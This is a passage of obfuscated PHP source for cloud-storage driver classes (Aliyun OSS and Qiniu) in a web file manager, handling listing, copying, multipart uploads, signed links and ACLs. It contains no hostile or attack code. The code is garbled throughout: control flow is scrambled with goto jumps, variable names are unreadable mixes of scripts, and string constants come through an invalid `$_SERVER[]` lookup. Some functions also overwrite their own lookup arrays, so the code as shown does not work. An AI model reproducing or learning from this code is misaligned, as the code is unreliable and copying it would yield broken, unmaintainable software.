array_merge($Fۊ, $aό[$a]); } } $Fۊ[] = self::AUTH_SHOW; $AӚ = array_sum(array_unique($Fۊ)); goto f裃; f裃: } public function sort($C§, $fΘ) { return parent::update($C§, $fΘ); } } goto Eؙï; eԉĕ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($a) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1263]; $this->_init($a); } public function _init($BԆƘ) { $Dȡٯ =& $_SERVER[]; foreach ($BԆƘ as $EȈ˦ => $AԞ┖) { if (isset($this->{$EȈ˦})) { $this->{$EȈ˦} = $AԞ┖; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Dȡٯ[1264] . LNG($Dȡٯ[1265])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto Bʥ¾; dх: $a->addRule($a); try { $this->client->putBucketCors($this->bucket, $a); } catch (OSS\Core\OssException $cƕÜ) { return !1; } return !0; goto fڙ; bҼ: $a->addAllowedOrigin($F潈[1266]); $a->addAllowedMethod($F潈[1267]); $a->addAllowedMethod($F潈[1268]); goto f͖; f͖: $a->addAllowedMethod($F潈[1269]); $a->addAllowedMethod($F潈[1270]); $a->addAllowedMethod($F潈[158]); goto D׺; D׺: $a->setMaxAgeSeconds(600); $a->addExposeHeader($F潈[1271]); $a->addAllowedHeader($F潈[1266]); goto dх; Bʥ¾: $F潈 =& $_SERVER[]; $a = new OSS\Model\CorsConfig(); $a = new OSS\Model\CorsRule(); goto bҼ; fڙ: } public function getBucketCors() { goto dۆ; eǆᖠ: $B = $A[0]->getMaxAgeSeconds(); $D = $A[0]->getExposeHeaders(); $cÞƏ = $A[0]->getAllowedHeaders(); goto A՞; A՞: return array($FÄ[181] => isset($Dٯ[0]) ? $Dٯ[0] : $FÄ[33], $FÄ[185] => $e؅, $FÄ[1272] => $B, $FÄ[1273] => isset($D[0]) ? $D[0] : $FÄ[33], $FÄ[183] => isset($cÞƏ[0]) ? $cÞƏ[0] : $FÄ[33]); goto e; d񺱼: if (!$f || !($A = $f->getRules())) { return null; } $Dٯ = $A[0]->getAllowedOrigins(); $e؅ = $A[0]->getAllowedMethods(); goto eǆᖠ; dۆ: $FÄ =& $_SERVER[]; $f = null; try { $f = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $E榝ߜ) { return null; } goto d񺱼; e: } public function isBucketCors() { goto A󑂺; A󑂺: $Bϝ =& $_SERVER[]; $C՗ = $this->getBucketCors(); if (!$C՗ || !is_array($C՗)) { return !1; } goto b̪; b: $b = array($Bϝ[186], $Bϝ[187], $Bϝ[188], $Bϝ[189], $Bϝ[190]); $eѯ = array_diff($b, $e͐); return empty($eѯ); goto c֑; b̪: if ($C՗[$Bϝ[181]] != $Bϝ[182] || $C՗[$Bϝ[183]] != $Bϝ[182]) { return !1; } $e͐ = array_map($Bϝ[184], $C՗[$Bϝ[185]]); if (!is_array($e͐)) { $e͐ = array(); } goto b; c֑: } public function mkfile($bԾ׫, $E짅 = '', $eЙѿ = REPEAT_RENAME) { $dе = $this->setContent($bԾ׫, $E짅); if ($dе !== !1) { return $this->getPathOuter($bԾ׫); } return !1; } public function mkdir($C謧, $dͬ = REPEAT_SKIP) { if ($this->_isFolder($C謧)) { return $this->getPathOuter($C謧); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($C謧)); } catch (OSS\Core\OssException $Eر⥦) { return !1; } return $this->getPathOuter($C謧); } private function fileList($E澸, $D饪 = '', $d܏ = 0) { goto C۩֌; C۩֌: $bƝ =& $_SERVER[]; $E澸 = trim($E澸, $bƝ[8]); $A = empty($E澸) && $E澸 !== $bƝ[191] ? $bƝ[33] : $E澸 . $bƝ[8]; goto f˘; D: return array($bƝ[75] => $F, $bƝ[74] => $f܈Π); goto b҂㝒; f˘: $cя = $bƝ[33]; $AۿĚ = 1000; $eʰ = $this->listItemCache === !1 ? !1 : !0; goto e; e: $F = $f܈Π = array(); while (!0) { check_abort(); $EƢ = array($bƝ[1274] => $D饪, $bƝ[1275] => $A, $bƝ[1276] => $AۿĚ, $bƝ[1277] => $cя); try { $EԪ = $this->client->listObjects($this->bucket, $EƢ); } catch (OSS\Core\OssException $Aʧ) { break; } $cя = $EԪ->getNextMarker(); $a㐬ل = $EԪ->getObjectList(); $A = $EԪ->getPrefixList(); foreach ($a㐬ل as $aĭ) { goto Fʋ; aה: $B = $aĭ->getLastModified(); $B띧 = $d܏ ? array($bƝ[28] => $C˕, $bƝ[78] => $bכѡ, $bƝ[197] => strtotime($B)) : $C˕; $fѳ = $bכѡ == 0 && substr($C˕, strlen($C˕) - 1, 1) == $bƝ[8] ? !0 : !1; goto d; Fʋ: if ($aĭ->getKey() == $A) { continue; } $C˕ = $aĭ->getKey(); $bכѡ = $aĭ->getSize(); goto aה; d: if ($eʰ) { $this->cacheMethod($bƝ[199], $C˕, $fѳ); $this->cacheMethod($bƝ[200], $C˕, array($bƝ[78] => $bכѡ, $bƝ[1278] => $bכѡ, $bƝ[84] => strtotime($B), $bƝ[1279] => $B)); } if ($fѳ) { $F[] = $C˕; continue; } $f܈Π[] = $B띧; goto e҈; e҈: } foreach ($A as $Bܪ) { $F[] = $Bܪ->getPrefix(); if ($eʰ) { $this->cacheMethod($bƝ[199], $C˕, !0); } } if ($cя === $bƝ[33]) { break; } } if ($eʰ) { $this->cacheMethod($bƝ[199], $E澸, !0); } goto D; b҂㝒: } public function copyFile($C҂, $Cم׵) { $F، = $this->size($C҂); if ($F، < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $C҂, $this->bucket, $this->pathEncode($Cم׵)); } catch (OSS\Core\OssException $AՈ) { return !1; } return $this->getPathOuter($Cم׵); } $D̗ = $this->multiCopyObject($C҂, $Cم׵, $F،); return $D̗ ? $this->getPathOuter($Cم׵) : !1; } private function multiCopyObject($e, $B, $F뎃) { $eĲ =& $_SERVER[]; try { goto E֎ڃҊ; f֪: $bΎ = 1; $bʇ = 0; $eư = array(); goto bԈС; F퍨: $dğ۵ = array(); foreach ($eư as $a => $a߻) { $dğ۵[] = array($eĲ[1284] => $a + 1, $eĲ[1285] => $a߻); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($B), $Bǔ, $dğ۵); goto Dӓ; E֎ڃҊ: $cէ = array(); if ($eΉ = $this->hashMd5($e)) { $cէ = array(OSS\OssClient::OSS_HEADERS => array($eĲ[1280] => $eΉ)); } $Bǔ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B), $cէ); goto f֪; bԈС: $A݃ = 1024 * 1024 * 10; $E = $this->client->generateMultiuploadParts($F뎃, $A݃); foreach ($E as $a => $bڛ) { $A = $bʇ + (int) $bڛ[$eĲ[1281]]; $bܺ̓ = (int) $bڛ[$eĲ[335]] + $A - 1; $B՚ = array($eĲ[1282] => $A, $eĲ[1283] => $bܺ̓); $eư[] = $this->client->uploadPartCopy($this->bucket, $e, $this->bucket, $this->pathEncode($B), $bΎ, $Bǔ, $B՚); $bΎ = $bΎ + 1; } goto F퍨; Dӓ: } catch (OSS\Core\OssException $B꾑) { return !1; } return !0; } public function moveFile($b, $Aȱ) { if ($this->copyFile($b, $Aȱ)) { $this->remove($b); return $this->getPathOuter($Aȱ); } return !1; } public function delFile($e֮Т) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($e֮Т)); } catch (OSS\Core\OssException $b) { return !1; } return !0; } public function delFolder($E) { goto Dܓُ; Dܓُ: $dï =& $_SERVER[]; if (!$this->exist($E)) { return !0; } $this->listItemCache = !1; goto eؾƨ; bٝ: if (!empty($E) && $E !== $dï[191] && !in_array($B, $d[$dï[75]])) { $d[$dï[75]][] = $B; } $E = $this->delByBatch($d[$dï[74]]); if (!$E) { return !1; } goto C皌; C皌: $E = $this->delByBatch($d[$dï[75]]); if (!$E) { return !1; } return $this->delFile($B); goto e; eؾƨ: $d = $this->fileList($E); $this->listItemCache = !0; $B = trim($E, $dï[8]) . $dï[8]; goto bٝ; e: } private function delByBatch($a) { foreach (array_chunk($a, 1000) as $Aນ) { try { $this->client->deleteObjects($this->bucket, $Aນ); } catch (OSS\Core\OssException $d楻ʶ) { return !1; } } return !0; } public function rename($D, $bƄ) { return $this->renameObject($D, $bƄ); } private function fileInfo($B͊, $e˺ = false, $Eބ = array()) { goto F; F: $dŨ =& $_SERVER[]; $d̮ = array($dŨ[28] => $this->pathThis($B͊), $dŨ[76] => $this->getPathOuter($B͊), $dŨ[29] => $dŨ[193], $dŨ[78] => isset($Eބ[$dŨ[78]]) ? $Eބ[$dŨ[78]] : 0, $dŨ[168] => $this->ext($B͊)); if ($e˺) { return $d̮; } goto AЦɄ; Bߛ: if (isset($Eބ[$dŨ[78]])) { $d̮[$dŨ[78]] = $Eބ[$dŨ[78]]; } if (isset($Eބ[$dŨ[84]])) { $d̮[$dŨ[84]] = $Eބ[$dŨ[84]]; } if (isset($Eބ[$dŨ[197]]) && !trim($d̮[$dŨ[84]])) { $d̮[$dŨ[84]] = $Eބ[$dŨ[197]]; } goto e½; AЦɄ: $d̮[$dŨ[194]] = $d̮[$dŨ[84]] = 0; $d̮[$dŨ[195]] = $d̮[$dŨ[196]] = !0; if (empty($Eބ)) { $B֩ = $this->objectMeta($B͊); if (!$B֩) { return $d̮; } $Eބ = array($dŨ[84] => strtotime($B֩[$dŨ[1279]]), $dŨ[78] => $B֩[$dŨ[1278]] + 0); } goto Bߛ; e½: return $d̮; goto fŗ; fŗ: } private function folderInfo($fӳ, $E˷ = false, $cΝ = array()) { goto Eꄞ; Eꄞ: $D =& $_SERVER[]; $D = array($D[28] => $this->pathThis($fӳ), $D[76] => $this->getPathOuter($D[8] . $fӳ), $D[29] => $D[77]); if ($E˷) { return $D; } goto D␳; D␳: $D[$D[194]] = $D[$D[84]] = 0; $D[$D[195]] = $D[$D[196]] = !0; if (empty($cΝ)) { $fӳ = rtrim($fӳ, $D[8]) . $D[8]; $e٠ = $this->objectMeta($fӳ); if (!$e٠) { return $D; } $cΝ = array($D[194] => $e٠[$D[492]][$D[1286]], $D[84] => strtotime($e٠[$D[1279]])); } goto e͉ߎ; e͉ߎ: if (isset($cΝ[$D[84]])) { $D[$D[84]] = $cΝ[$D[84]]; } if (isset($cΝ[$D[194]])) { $D[$D[194]] = $cΝ[$D[194]]; } return $D; goto f; f: } public function listPath($b됱, $fό˃ = false) { $D =& $_SERVER[]; $E = $this->fileList($b됱, $D[8], !0); foreach ($E[$D[75]] as $Aخ뤆 => $F檋) { $E[$D[75]][$Aخ뤆] = $this->folderInfo($F檋, $fό˃, $F檋); } foreach ($E[$D[74]] as $Aخ뤆 => $F檋) { $E[$D[74]][$Aخ뤆] = $this->fileInfo($F檋[$D[28]], $fό˃, $F檋); } return $E; } public function has($aş, $E۲ = false, $e҆ = true) { goto d; d: $eӺ˄ =& $_SERVER[]; $aş = trim($aş, $eӺ˄[8]); $d = empty($aş) && $aş !== $eӺ˄[191] ? $eӺ˄[33] : $aş . $eӺ˄[8]; goto Eæ; f: while (!0) { check_abort(); $dՐ = array($eӺ˄[1274] => $eӺ˄[8], $eӺ˄[1275] => $d, $eӺ˄[1276] => $A, $eӺ˄[1277] => $d); try { $b֌Ǝܐ = $this->client->listObjects($this->bucket, $dՐ); } catch (OSS\Core\OssException $Dժ) { break; } $d = $b֌Ǝܐ->getNextMarker(); $aʳ = $b֌Ǝܐ->getObjectList(); $Aհ = $b֌Ǝܐ->getPrefixList(); if ($E۲) { if (count($aʳ) > 1 || count($aʳ) == 1 && $aʳ[0]->getKey() != $d) { $c += count($aʳ) - 1; } if (!empty($Aհ)) { $d޾ += count($Aհ); } if ($d === $eӺ˄[33]) { break; } continue; } if ($e҆) { if (!empty($aʳ)) { if (count($aʳ) > 1 || $aʳ[0]->getKey() != $d) { return !0; } } } else { if (!empty($Aհ)) { return !0; } } if ($d === $eӺ˄[33]) { break; } } if ($E۲) { return array($eӺ˄[203] => $c, $eӺ˄[204] => $d޾); } return !1; goto Bޮ; Eæ: $d = $eӺ˄[33]; $A = 500; $c = $d޾ = 0; goto f; Bޮ: } public function listAll($c) { $Bݙ =& $_SERVER[]; $dݸ = $this->fileList($c, $Bݙ[33], !0); $C = array(); foreach ($dݸ[$Bݙ[74]] as $fە) { $C[$fە[$Bݙ[28]]] = $fە[$Bݙ[78]]; } foreach ($dݸ[$Bݙ[75]] as $fە) { if (is_string($fە)) { $C[$fە] = 0; } } return $this->listAllFiles($c, array_keys($C), $C); } public function canRead($F) { $Fդݺ =& $_SERVER[]; $dḕ = $this->pathAcl($F); return $dḕ == $Fդݺ[1287] || $dḕ == $Fդݺ[532] ? !0 : !1; } public function canWrite($cä) { $aȍ = $this->pathAcl($cä); return $aȍ == $_SERVER[][532] ? !0 : !1; } public function pathAcl($C˰) { goto bّ; bѣӈ: return $b; goto cᣥ; bȅ: $b = $fƊ == $F纍[34] ? $this->bucketAcl : $fƊ; if ($b == $F纍[1288]) { return $F纍[1287]; } if ($b == $F纍[1289]) { return $F纍[532]; } goto bѣӈ; bّ: $F纍 =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $fƊ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($C˰)); } catch (OSS\Core\OssException $F֏) { return !1; } goto bȅ; cᣥ: } private function chmodPath($b, $cȊҫۅ = '') { $B =& $_SERVER[]; $D삨 = empty($cȊҫۅ) ? $B[1289] : $cȊҫۅ; $E̐ = array($B[34], $B[192], $B[1288], $B[1289]); if (!in_array($D삨, $E̐)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b), $D삨); } catch (OSS\Core\OssException $E孰ݩΛ) { return !1; } return !0; } public function getContent($DȜ) { return $this->fileSubstr($DȜ, -1); } public function setContent($DΜƻ, $C = '') { $d冈 =& $_SERVER[]; try { $e = $this->trafficLimit($d冈[1290]); $eÎ = $this->client->putObject($this->bucket, $this->pathEncode($DΜƻ), $C, $e); } catch (OSS\Core\OssException $DͲ) { return !1; } $d̍ = array($d冈[1280] => trim($eÎ[$d冈[1291]], $d冈[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($DΜƻ))); $this->updateObjMeta($DΜƻ, $d̍); return isset($eÎ[$d冈[1292]][$d冈[1239]]) ? !0 : !1; } private function updateObjMeta($Aކ, $Aǃ޿) { $Aކ = $this->pathEncode($Aކ); try { $AԢ = array(OSS\OssClient::OSS_HEADERS => $Aǃ޿); $this->client->copyObject($this->bucket, $Aކ, $this->bucket, $Aކ, $AԢ); } catch (OSS\Core\OssException $C) { return !1; } return !0; } public function upload($DŠ, $b, $E = false, $E؉ = REPEAT_REPLACE) { $cء =& $_SERVER[]; $f͖ = trim($DŠ, $cء[8]); $F兎뇛 = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($cء[1280] => @md5_file($b)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($DŠ))); $F兎뇛 = $this->trafficLimit($cء[1290], $F兎뇛); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($f͖), $b, $F兎뇛); } catch (OSS\Core\OssException $Fޖ) { return !1; } return $this->getPathOuter($DŠ); } public function getHost() { $Cڙ =& $_SERVER[]; $eӖ = explode($Cڙ[177], parent::getHost()); return $eӖ[0] . $Cڙ[177] . $this->bucket . $Cڙ[95] . $eӖ[1]; } public function uploadFormData($a, $B䘽 = 3600) { goto d; B: $E = date($cܖ[1293], time() + $cو); $A뗚 = new DateTime($E); $Dؿݕ = $A뗚->format(DateTime::ISO8601); goto D㌤; F: $F݋ǅ = base64_encode(hash_hmac($cܖ[230], $E窒, $this->secret, !0)); $Aډ = array($cܖ[1204] => $E窒, $cܖ[1296] => $this->accessKey, $cܖ[1200] => $cܖ[1192], $cܖ[1297] => $F݋ǅ, $cܖ[175] => $b򚼒); $Aډ = $this->trafficLimit($cܖ[1290], $Aډ); goto d㪍; D: $B = $this->pathFather($a); $D鉼 = array($cܖ[1194] => $Dؿݕ, $cܖ[1195] => array(array($cܖ[1295], 0, $a޳), array($cܖ[1198], $cܖ[1199], $B))); $E窒 = base64_encode(json_encode($D鉼)); goto F; d: $cܖ =& $_SERVER[]; if (!($b򚼒 = $this->getHost())) { return !1; } $cو = $B䘽; goto B; d㪍: return $Aډ; goto bԥ; D㌤: $c螪 = strpos($Dؿݕ, $cܖ[294]); $Dؿݕ = substr($Dؿݕ, 0, $c螪) . $cܖ[1294]; $a޳ = 1048576000 * 5; goto D; bԥ: } public function multiUploadFormData($D, $f = 3600) { $Bʣ =& $_SERVER[]; if (!($BӜ = $this->getHost())) { return !1; } $D = $this->trafficLimit($Bʣ[1290]); $Bφ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D), $D); return array($Bʣ[221] => $Bφ, $Bʣ[175] => $BӜ . $Bʣ[8] . $this->pathEncode($D), $Bʣ[222] => gmdate($Bʣ[1298]), $Bʣ[93] => $D); } public function multiUploadAuthData($B, $dꥐ = array()) { goto f䴕; fǚ: $DоǺ = $B; if (isset($dꥐ[$eʕǏ[93]])) { $DоǺ = $dꥐ[$eʕǏ[93]]; unset($dꥐ[$eʕǏ[93]]); } if (isset($dꥐ[$eʕǏ[223]])) { $dꥐ[$eʕǏ[222]] = $c㨟; return $this->listUploadParts($DоǺ, $dꥐ); } goto Bޠ; fʾ: $d̎ = $eʕǏ[1264] . $this->accessKey . $eʕǏ[4] . $AЃ; if (strpos($F, $eʕǏ[225]) === 0) { $d̎ = array($eʕǏ[232] => $d̎, $eʕǏ[222] => $c㨟); if ($Dِ) { $d̎ = array_merge($d̎, $Dِ); } } return $d̎; goto Cƍ; Bޠ: $c޶ = array($eʕǏ[224], $eʕǏ[33], $eʕǏ[119], $c㨟, "\170\55\x6f\163\163\55\x64\141\164\145\x3a{$c㨟}", $eʕǏ[8] . $this->bucket . $eʕǏ[8] . $DоǺ . $F); if (strpos($F, $eʕǏ[225]) === 0) { $c޶[0] = $eʕǏ[226]; if ($Dِ = $this->trafficLimit($eʕǏ[1290])) { $DоǺ = $eʕǏ[1299]; array_splice($c޶, 5, 0, $DоǺ . $eʕǏ[4] . $Dِ[$DоǺ]); } } if (isset($dꥐ[$eʕǏ[227]]) && $dꥐ[$eʕǏ[227]] == $eʕǏ[228]) { $c޶[0] = $eʕǏ[228]; } goto fژ; fژ: if (!empty($dꥐ[$eʕǏ[1300]])) { $b紶 = array_merge(array($c޶[4]), $dꥐ[$eʕǏ[1300]]); sort($b紶); $c޶[4] = implode($eʕǏ[229], $b紶); } $Eݿ꛺ = implode($eʕǏ[229], $c޶); $AЃ = base64_encode(hash_hmac($eʕǏ[230], $Eݿ꛺, $this->secret, !0)); goto fʾ; f䴕: $eʕǏ =& $_SERVER[]; $c㨟 = isset($dꥐ[$eʕǏ[222]]) ? $dꥐ[$eʕǏ[222]] : gmdate($eʕǏ[1298]); $F = isset($dꥐ[$eʕǏ[168]]) ? $dꥐ[$eʕǏ[168]] : $eʕǏ[33]; goto fǚ; Cƍ: } public function listUploadParts($b, $E) { goto bԽ; a垗: unset($E[$E䞷硼[223]], $E[$E䞷硼[227]]); $Fǖ̏ = $this->multiUploadAuthData($b, $E); if (empty($Fǖ̏)) { return !1; } goto dŇ; bԽ: $E䞷硼 =& $_SERVER[]; $BѴһ = parse_url_query($E[$E䞷硼[168]]); $D = $this->client->listParts($this->bucket, $this->pathEncode($b), $BѴһ[$E䞷硼[221]]); goto d; d: $F䇟 = $D->getListPart(); $aŧȶ = array(); foreach ($F䇟 as $dǖ) { $aŧȶ[] = array($E䞷硼[1284] => $dǖ->getPartNumber(), $E䞷硼[1285] => trim($dǖ->getETag(), $E䞷硼[116])); } goto a垗; dŇ: return array($E䞷硼[232] => $Fǖ̏, $E䞷硼[222] => $E[$E䞷硼[222]], $E䞷硼[234] => $aŧȶ); goto B榩搽; B榩搽: } public function download($b򴯎, $aۅ) { if ($this->isFolder($b򴯎)) { return !1; } try { $aٚ׎ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $aۅ); $aٚ׎ = $this->trafficLimit($_SERVER[][109], $aٚ׎); $this->client->getObject($this->bucket, $this->pathEncode($b򴯎), $aٚ׎); } catch (OSS\Core\OssException $e˓͎) { return !1; } return $aۅ; } public function fileSubstr($d։, $E = 0, $F = false) { if ($E === -1) { $E = array(); } else { if ($F === !1) { $F = $this->size($d։); } else { $F = $E + $F - 1; } $E = array(OSS\OssClient::OSS_RANGE => "{$E}\x2d{$F}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($d։), $E); } catch (OSS\Core\OssException $c) { think_exception($c->getMessage()); return !1; } } private function trafficLimit($fċΣٰ, $fщѰ = array()) { goto dߘ; dթ咞: if (!$eϺ) { return $fщѰ; } $eϺ = $eϺ < 819200 ? 819200 : ($eϺ > 838860800 ? 838860800 : $eϺ); $fщѰ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($eϺ); goto EȂ; dߘ: $E =& $_SERVER[]; if ($fċΣٰ == $E[1290] && $this->isUploadServer() || $fċΣٰ == $E[109] && $this->isFileOutServer()) { return $fщѰ; } $eϺ = floatval($GLOBALS[$E[6]][$E[88]][$E[107]][$fċΣٰ]) * 1024 * 1024 * 8; goto dթ咞; EȂ: return $fщѰ; goto aپ; aپ: } public function link($C, $FГ = array()) { $fǹ =& $_SERVER[]; if (!$this->exist($C) || $this->isFolder($C)) { return !1; } try { $FГ = $this->trafficLimit($fǹ[109], $FГ); $Eӎ = $this->client->signUrl($this->bucket, $this->pathEncode($C), 3600 * 12, $fǹ[228], $FГ); return $this->getCdnLink($Eӎ); } catch (OSS\Core\OssException $c޿) { return !1; } } public function fileOut($cſ, $c = false, $dƟ = false, $b = '') { goto dӬ; dӬ: $A描 =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($cſ, $c, $dƟ, $b); } if (!$dƟ) { $dƟ = $this->pathThis($cſ); } goto e׌; e׌: $dƟ = rawurlencode($dƟ); $aީ = get_file_mime(get_path_ext($dƟ)); if ($aީ == $A描[213]) { return parent::fileOut($cſ, $c, $dƟ, $b); } goto aۈ٩; D: $ďυ = $this->link($cſ, $Eʭ); $this->fileOutLink($ďυ); goto Bԅ; aۈ٩: $c = $c ? $A描[214] : $A描[215]; $Eʭ = array(OSS\OssClient::OSS_SUB_RESOURCE => $A描[1301] . rawurlencode("{$c}\x3b\146\151\154\145\x6e\141\x6d\x65\x3d{$dƟ}")); $Eʭ[OSS\OssClient::OSS_SUB_RESOURCE] .= $A描[1302] . rawurlencode($aީ); goto D; Bԅ: } public function fileOutServer($fĚ, $dҜ = false, $F꫹ = false, $Cഡά = '') { parent::fileOut($fĚ, $dҜ, $F꫹, $Cഡά); } public function fileOutImage($DӉ, $Eч = 250) { $EԌ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1303] . $Eч); $c = $this->link($DӉ, $EԌ); $this->fileOutLink($c); } public function fileOutImageServer($Fݻ, $Bʕ = 250) { parent::fileOutImage($Fݻ, $Bʕ); } public function fileOutLink($Bܔ) { $CІǴ =& $_SERVER[]; if (!$this->isCdnHost() && substr($Bܔ, 0, 7) == $CІǴ[1207]) { $Bܔ = $CІǴ[1208] . substr($Bܔ, 7); } header($CІǴ[159] . $Bܔ); die; } public function hashMd5($B, $Eٵ = '') { $D =& $_SERVER[]; $F = $this->_objectMeta($B); if (!$F) { return $D[33]; } if (!isset($F[$D[1280]]) && !empty($Eٵ)) { $DՍ = $this->updateObjMeta($B, array($D[1280] => $Eٵ)); $F[$D[1280]] = $DՍ ? $Eٵ : $D[33]; } return isset($F[$D[1280]]) ? strtolower($F[$D[1280]]) : $D[33]; } public function size($eٌΞ) { $F = $this->objectMeta($eٌΞ); return $F ? $F[$_SERVER[][78]] : 0; } public function info($bھ) { if ($this->isFolder($bھ)) { return $this->folderInfo($bھ); } else { if ($this->isFile($bھ)) { return $this->fileInfo($bھ); } } return !1; } public function exist($E六Ļ) { return $this->isFile($E六Ļ) || $this->isFolder($E六Ļ); } public function isFile($Bó) { return !$this->isFolder($Bó) && $this->objectMeta($Bó); } public function isFolder($bւ꾩) { return $this->cacheMethod($_SERVER[][199], $bւ꾩); } protected function objectMeta($cઓÓ) { return $this->cacheMethod($_SERVER[][200], $cઓÓ); } protected function _objectMeta($a) { $e =& $_SERVER[]; try { $Aُ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($a)); } catch (OSS\Core\OssException $cļ) { $Aُ = !1; } if ($Aُ) { $Aُ[$e[78]] = intval($Aُ[$e[1278]]); } return $Aُ; } protected function _isFolder($F邆) { $c =& $_SERVER[]; if ($F邆 == $c[33] || $F邆 == $c[8]) { return !0; } $dǷ񥓹 = array($c[1274] => $c[8], $c[1275] => rtrim($F邆, $c[8]) . $c[8], $c[1276] => 1, $c[1277] => $c[33]); $A狶 = $this->client->listObjects($this->bucket, $dǷ񥓹); if ($A狶->getObjectList() || $A狶->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($f݅) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1304]; $this->_init($f݅); } public function _init($Aƌ) { goto C訉Ą; f: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto aޭ; C訉Ą: $FЖ =& $_SERVER[]; foreach ($Aƌ as $f؟֢ => $F˝) { if (isset($this->{$f؟֢})) { $this->{$f؟֢} = $F˝; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($FЖ[1305] . LNG($FЖ[1265])); } goto F; F: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto f; aޭ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($f, $b׎ = '', $cǂ = REPEAT_RENAME) { if ($this->setContent($f, $b׎)) { return $this->getPathOuter($f); } return !1; } public function mkdir($D, $C = REPEAT_SKIP) { goto F즲; F즲: $f =& $_SERVER[]; $F = trim($D, $f[8]); if ($this->_isFolder($F)) { return $this->getPathOuter($F); } goto AĴ; AĴ: $D = $F . $f[8]; $dʋ = get_path_this($F); $d = $D . $dʋ; goto Dĝ; Dĝ: if (!$this->mkfile($d)) { return !1; } if (!$this->moveFile($d, $D)) { $this->delFile($d); return !1; } return $this->getPathOuter($F); goto cσ; cσ: } public function copyFile($e𖄨, $aꂋܪ) { $E덻 = $this->bucketManager->copy($this->bucket, $e𖄨, $this->bucket, $aꂋܪ, !0); return $E덻 ? !1 : $this->getPathOuter($aꂋܪ); } public function moveFile($fƌ傚, $c硌ᤛ) { $AӬ = $this->bucketManager->move($this->bucket, $fƌ傚, $this->bucket, $c硌ᤛ, !0); return $AӬ ? !1 : $this->getPathOuter($c硌ᤛ); } public function delFile($b) { if (!$this->exist($b)) { return !0; } $e = $this->bucketManager->delete($this->bucket, $b); return $e ? !1 : !0; } public function delFolder($b) { goto dَ䣛; dَ䣛: $eݶ =& $_SERVER[]; if (!$this->exist($b)) { return !0; } $this->listItemCache = !1; goto e; DЋ: if (!empty($b) && $b !== $eݶ[191] && !in_array($Eʄ, $f[$eݶ[75]])) { $f[$eݶ[75]][] = $Eʄ; } $CŲ = $this->delByBatch($f[$eݶ[74]]); if (!$CŲ) { return !1; } goto E텹; E텹: $CŲ = $this->delByBatch($f[$eݶ[75]]); if (!$CŲ) { return !1; } return $this->delFile($Eʄ); goto Cꉲ; e: $f = $this->fileList($b); $this->listItemCache = !0; $Eʄ = trim($b, $eݶ[8]) . $eݶ[8]; goto DЋ; Cꉲ: } private function delByBatch($fΔ) { foreach (array_chunk($fΔ, 1000) as $D) { $b폶 = $this->bucketManager->buildBatchDelete($this->bucket, $D); list($b, $f̏) = $this->bucketManager->batch($b폶); if ($f̏) { return !1; } } return !0; } public function rename($F, $f꿫) { return $this->renameObject($F, $f꿫); } public function fileInfo($Eݗ, $Bĉ = false, $f񋑚Ϗ = array()) { goto b; Eﭴ: if (isset($f񋑚Ϗ[$CǢ[1307]])) { $b[$CǢ[84]] = substr($f񋑚Ϗ[$CǢ[1307]] . $CǢ[33], 0, 10); } if (isset($f񋑚Ϗ[$CǢ[1306]])) { $b[$CǢ[78]] = $f񋑚Ϗ[$CǢ[1306]]; } return $b; goto e♗; b: $CǢ =& $_SERVER[]; $b = array($CǢ[28] => $this->pathThis($Eݗ), $CǢ[76] => $this->getPathOuter($CǢ[8] . $Eݗ), $CǢ[29] => $CǢ[193], $CǢ[78] => isset($f񋑚Ϗ[$CǢ[1306]]) ? $f񋑚Ϗ[$CǢ[1306]] : 0, $CǢ[168] => $this->ext($Eݗ)); if ($Bĉ) { return $b; } goto E; E: $b[$CǢ[194]] = $b[$CǢ[84]] = 0; $b[$CǢ[195]] = $b[$CǢ[196]] = !0; if (empty($f񋑚Ϗ)) { $f񋑚Ϗ = $this->objectMeta($Eݗ); if (!$f񋑚Ϗ) { return $b; } } goto Eﭴ; e♗: } public function folderInfo($fϢ, $EМⷧ̿ = false) { goto aܸ; Bі: $c[$c[194]] = $c[$c[84]] = 0; $c[$c[195]] = 